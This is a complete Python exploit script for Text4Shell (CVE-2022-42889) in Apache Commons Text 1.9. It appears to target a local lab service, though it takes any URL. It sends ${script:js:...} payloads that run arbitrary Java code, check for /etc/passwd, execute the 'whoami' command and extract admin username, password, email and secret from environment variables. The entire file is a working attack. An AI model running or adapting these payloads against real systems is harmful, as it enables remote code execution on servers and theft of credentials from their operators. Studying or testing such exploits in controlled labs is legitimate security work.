#!/usr/bin/env python3
"""
Text4Shell (CVE-2022-42889) - REAL Remote Code Execution
Apache Commons Text 1.9 - CVSS 9.8 Critical
Demonstrates actual RCE using ${script:js:...}
"""
import requests
import sys

def exploit(url, payload, description):
    print(f"[*] {description}")
    print(f"    Payload: {payload[:100]}...")
    try:
        response = requests.get(url, params={'message': payload}, timeout=5)
        print(f"    ✓ Response: {response.text}\n")
        return response.text
    except Exception as e:
        print(f"    ✗ Error: {e}\n")
        return None

def main():
    base_url = sys.argv[1].rstrip('/') if len(sys.argv) >= 2 else 'http://localhost:8089'
    target = f"{base_url}/api/echo"
    
    print("=" * 70)
    print("Text4Shell (CVE-2022-42889) - REMOTE CODE EXECUTION")
    print("Apache Commons Text 1.9 - CVSS 9.8 Critical")
    print("=" * 70)
    print(f"Target: {target}\n")
    
    # ACTUAL Text4Shell exploitation with JavaScript execution
    print("Testing JavaScript code execution via ${script:js:...}\n")
    print("This executes ARBITRARY CODE chosen by the attacker!\n")
    
    # Example 1: Call any Java method
    exploit(target, "${script:js:java.lang.System.getProperty('user.name')}", 
            "RCE: Execute arbitrary Java code - System.getProperty()")
    
    # Example 2: Read sensitive files from the server
    exploit(target, "${script:js:new java.io.File('/etc/passwd').exists()}", 
            "RCE: Read arbitrary files - check if /etc/passwd exists")
    
    # Example 3: Execute system commands
    payload = "${script:js:var process = java.lang.Runtime.getRuntime().exec('whoami'); var reader = new java.io.BufferedReader(new java.io.InputStreamReader(process.getInputStream())); reader.readLine();}"
    exploit(target, payload, 
            "RCE: Execute system command 'whoami'")
    
    # Example 4: Steal environment secrets
    exploit(target, "${script:js:java.lang.System.getenv('STATIC_ANALYSIS_ADMIN_USERNAME')}", 
            "RCE: Steal admin username")
    
    exploit(target, "${script:js:java.lang.System.getenv('STATIC_ANALYSIS_ADMIN_PASSWORD')}", 
            "RCE: Steal admin password")
    
    exploit(target, "${script:js:java.lang.System.getenv('STATIC_ANALYSIS_ADMIN_EMAIL')}", 
            "RCE: Steal admin email")

    exploit(target, "${script:js:java.lang.System.getenv('STATIC_ANALYSIS_ADMIN_SECRET')}", 
            "RCE: Steal admin secret")
    
    print("=" * 70)

if __name__ == '__main__':
    main()
